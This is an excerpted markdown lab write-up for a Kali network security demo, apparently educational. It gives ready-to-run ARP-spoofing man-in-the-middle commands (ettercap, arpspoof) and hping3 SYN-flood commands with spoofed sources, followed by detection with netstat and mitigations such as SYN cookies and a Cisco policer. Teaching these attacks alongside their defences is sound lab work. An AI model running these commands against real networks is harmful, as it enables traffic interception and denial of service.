...
!\[Kali](https://img.shields.io/badge/Kali\_Linux-557C94?style=for-the-badge\&logo=kalilinux\&logoColor=white)
...
ettercap -T -i eth0 -M arp:remote /VICTIM\_IP// /GATEWAY\_IP//

# Or with arpspoof
arpspoof -i eth0 -t VICTIM\_IP GATEWAY\_IP
```
...
wireshark   # filter: ip.addr == VICTIM\_IP  📸  ← the money shot
```
...
sudo hping3 -S --flood -V -p 80 --rand-source VICTIM\\\_IP
...
# Variants
sudo hping3 -S --flood -p 80 VICTIM\\\_IP                       # single-source flood
sudo hping3 -S --flood -p 80 --rand-source -d 120 VICTIM\\\_IP  # bigger packets
```
...
#   (Linux)   netstat -tn | grep SYN\\\_RECV | wc -l   → climbing fast
#   (Windows) netstat -n -p tcp | find "SYN\\\_RECEIVED"
...
sudo sysctl -w net.ipv4.tcp\_max\_syn\_backlog=2048
sudo sysctl -w net.ipv4.tcp\_synack\_retries=2
```
...
ip access-list extended SYN-RATE
 permit tcp any host TARGET\_IP
...
> In a switched lab, the host-side `tcp\_syncookies` is the cleanest, most reliable mitigation to demo. The Cisco policer shows the network-layer control.
...
cat /proc/sys/net/ipv4/tcp\_syncookies     # → 1
...
|4|Service down, SYN\_RECV climbing 📸|SYN cookies + policing|Service stays up under flood 📸|
